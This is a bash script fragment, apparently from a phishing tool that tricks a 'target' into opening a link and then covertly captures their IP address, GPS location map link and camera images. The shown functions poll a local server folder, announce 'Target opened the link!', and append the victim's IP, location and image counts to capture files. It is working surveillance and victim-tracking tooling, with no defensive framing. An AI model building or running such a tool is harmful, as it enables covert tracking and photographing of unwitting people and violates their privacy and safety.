#!/bin/bash

extract_ip() {
    local ip
    ip=$(grep 'IP:' "$SCRIPT_DIR/.server/ip.txt" | cut -d " " -f2 | tr -d '\r')

    if [[ -n "$ip" ]]; then
        printf "    ${cyan}[${green}+${cyan}]${white} IP: ${orange}%s\n${nocolor}" "$ip"
        cat "$SCRIPT_DIR/.server/ip.txt" >> "$SCRIPT_DIR/captured_ip.txt"
    fi
}

extract_location() {
    if [[ -f "$SCRIPT_DIR/.server/map.txt" ]]; then
        local last_location
        last_location=$(tail -n 10 "$SCRIPT_DIR/.server/map.txt" | grep "Map Link" | tail -1)
        if [[ -n "$last_location" ]]; then
            printf "    ${cyan}[${green}📍${cyan}]${white} Location Captured: ${orange}%s\n${nocolor}" "$last_location"
            # រក្សាទុកទីតាំង
            cat "$SCRIPT_DIR/.server/map.txt" >> "$SCRIPT_DIR/captured_locations.txt"
            # រក្សាទុក Link ចុងក្រោយ
            grep "Map Link" "$SCRIPT_DIR/.server/map.txt" | tail -1 | cut -d " " -f4- > "$SCRIPT_DIR/.server/latest_map.txt"
        fi
    fi
}

checked() {
    echo ""
    echo "    ${cyan}[${green}-${cyan}]${white} Waiting for target... Press ${red}Ctrl+C${white} to exit.${nocolor}"
    trap terminate INT

    while true; do
        # Target opened the link → IP logged
        if [[ -e "$SCRIPT_DIR/.server/ip.txt" ]]; then
            echo "    ${cyan}[${green}✓${cyan}]${white} Target opened the link!${nocolor}"
            extract_ip
            rm -f "$SCRIPT_DIR/.server/ip.txt"
        fi

        # Check for new location
        if [[ -e "$SCRIPT_DIR/.server/map.txt" ]]; then
            echo "    ${cyan}[${green}✓${cyan}]${white} Location data received!${nocolor}"
            extract_location
            rm -f "$SCRIPT_DIR/.server/map.txt"
        fi

        sleep 0.5

        # verify actual image file was received, show count
        if [[ -e "$SCRIPT_DIR/.server/Logs.log" ]]; then
            local img_count=0
            if [[ -d "$SCRIPT_DIR/.server/images" ]]; then
                img_count=$(ls "$SCRIPT_DIR/.server/images/" 2>/dev/null | wc -l)
            fi
            echo "    ${cyan}[${green}✓${cyan}]${white} Image received! Total captured this session: ${orange}$img_count${nocolor}"
            move_capture_file 2>/dev/null
            rm -f "$SCRIPT_DIR/.server/Logs.log"
        fi

        sleep 0.5
    done
}